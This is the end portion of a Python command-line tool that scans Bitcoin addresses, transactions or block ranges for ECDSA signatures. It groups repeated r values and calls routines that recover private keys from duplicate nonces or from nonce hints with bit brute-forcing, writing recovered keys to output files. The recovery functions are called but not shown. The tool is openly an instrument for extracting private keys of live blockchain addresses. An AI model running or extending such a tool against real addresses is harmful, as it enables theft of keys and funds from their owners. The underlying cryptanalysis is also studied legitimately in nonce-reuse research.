            try: rows.append(json.loads(line))
            except: pass
    by={}
    for r in rows:
        key=(r.get("r"), (r.get("pubkey_hex") or "").lower())
        by.setdefault(key, []).append({"txid":r.get("txid"),"vin":r.get("vin")})
    wrote=0
    with open(dup_same_pub,"a") as f:
        for (r,pub), arr in by.items():
            if not pub or len(arr)<2: continue
            f.write(json.dumps({"r":r,"pubkey":pub,"count":len(arr),"sightings":arr})+"\n")
            wrote+=1
    log.info(f"[dupR same pub] {wrote} cluster(s) -> {dup_same_pub}")

    by_r={}
    for r in rows:
        rr=r.get("r")
        by_r.setdefault(rr, set()).add((r.get("pubkey_hex") or "").lower())
    wrote2=0
    with open(dup_cross_pub,"a") as f:
        for rr, pubs in by_r.items():
            pubs = {p for p in pubs if p}
            if len(pubs)>=2:
                f.write(json.dumps({"r":rr,"pubkeys":sorted(list(pubs))})+"\n")
                wrote2+=1
    log.info(f"[r collisions across pubs] {wrote2} record(s) -> {dup_cross_pub}")

# ---------- CLI ----------
def main():
    ap = argparse.ArgumentParser(description="Unified ECDSA signature scanner + dupR & nonce recovery")
    ap.add_argument("--addr", action="append", default=[], help="address to scan (repeatable)")
    ap.add_argument("--addr-file", default="", help="file with one address per line")
    ap.add_argument("--tx", action="append", default=[], help="txid to scan (repeatable)")
    ap.add_argument("--tx-file", default="", help="file with one txid per line")
    ap.add_argument("--heights", default="", help="comma-separated block heights (e.g. 91722,91880)")
    ap.add_argument("--start-height", type=int, default=None, help="scan blocks from this height (inclusive)")
    ap.add_argument("--end-height", type=int, default=None, help="scan blocks up to this height (inclusive)")
    ap.add_argument("--out", default="signatures.jsonl", help="output JSONL (r,s,z,pub,txid,vin,prev_value,prev_spk)")
    ap.add_argument("--rlist", default="", help="optional r_values.txt to filter only these r's")
    ap.add_argument("--delay", type=float, default=0.0, help="sleep seconds between tx fetches")
    ap.add_argument("--report", action="store_true", help="write dupR reports after scan")
    ap.add_argument("--recover", action="store_true", help="attempt duplicate-r recovery after scan")

    # --- NEW: nonce-based recovery inputs ---
    ap.add_argument("--recover-nonce", action="store_true", help="attempt nonce-based recovery (known/range/bits)")
    ap.add_argument("--nonce-known-k", default="", help="JSONL with exact k per txid:vin -> {txid,vin,k}")
    ap.add_argument("--nonce-range", default="", help="JSONL with k ranges -> {txid,vin,k_start,k_end,step}")
    ap.add_argument("--nonce-bits", default="", help="JSONL bits hints -> {txid,vin,mode:lsb/msb,known_bits,unknown_bits,value}")
    ap.add_argument("--max-brutebits", type=int, default=20, help="max unknown bits for bits brute (sane cap)")

    ap.add_argument("--dup-same-pub", default="dupR_clusters.jsonl", help="output JSONL for same (r,pub) clusters")
    ap.add_argument("--dup-cross-pub", default="r_collisions.jsonl", help="output JSONL for cross-pub r collisions")
    ap.add_argument("--recovered-jsonl", default="recovered_keys.jsonl", help="output JSONL for recovered keys")
    ap.add_argument("--recovered-txt", default="recovered_keys.txt", help="output TXT for recovered keys")
    args = ap.parse_args()

    addrs = list(args.addr)
    if args.addr_file and os.path.exists(args.addr_file):
        addrs += [x.strip() for x in open(args.addr_file,encoding="utf-8") if x.strip()]
    txids = list(args.tx)
    if args.tx_file and os.path.exists(args.tx_file):
        txids += [x.strip() for x in open(args.tx_file,encoding="utf-8") if x.strip()]
    heights=[]
    if args.heights:
        for p in args.heights.split(","):
            p=p.strip()
            if p.isdigit(): heights.append(int(p))
    if args.start_height is not None and args.end_height is not None:
        heights += list(range(args.start_height, args.end_height+1))

    if not addrs and not txids and not heights:
        log.error("Provide --addr/--addr-file or --tx/--tx-file or --heights/--start-height+--end-height")
        return

    r_filter = load_r_filter(args.rlist)
    if r_filter: log.info(f"[info] r-filter loaded: {len(r_filter)} value(s)")

    api = API()
    total=0
    if addrs:
        total += scan_addresses(api, addrs, args.out, r_filter)
    if txids:
        total += scan_txids(api, txids, args.out, r_filter)
    if heights:
        total += scan_blocks(api, heights, args.out, r_filter, delay=args.delay)
    log.info(f"[summary] total signatures written: {total}")

    if args.report:
        write_dup_reports(args.out, args.dup_same_pub, args.dup_cross_pub)

    # ---- Recoveries ----
    rows=[]
    with open(args.out,"r",encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
            try: rows.append(json.loads(line))
            except: pass

    if args.recover:
        try_recover_dup_r(rows, args.recovered_jsonl, args.recovered_txt)

    if args.recover_nonce:
        known_k = load_jsonl(args.nonce_known_k)
        rngs    = load_jsonl(args.nonce_range)
        bits    = load_jsonl(args.nonce_bits)
        recover_with_nonce_hints(rows, known_k, rngs, bits, args.max_brutebits,
                                 args.recovered_jsonl, args.recovered_txt)

if __name__ == "__main__":
    main()
